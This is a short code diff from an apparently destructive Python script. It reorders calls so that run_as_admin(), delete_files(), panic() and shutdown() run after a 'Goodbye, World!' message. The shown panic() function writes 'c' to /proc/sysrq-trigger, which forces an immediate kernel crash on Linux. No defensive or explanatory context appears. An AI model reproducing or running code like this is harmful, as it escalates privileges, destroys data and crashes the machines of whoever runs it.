@@ -29,10 +29,9 @@ def panic():
     if system == "Linux":
         os.system("echo c > /proc/sysrq-trigger")
 
-run_as_admin()
-delete_files()
-
 print("Goodbye, World!")
 
+run_as_admin()
+delete_files()
 panic()
 shutdown()
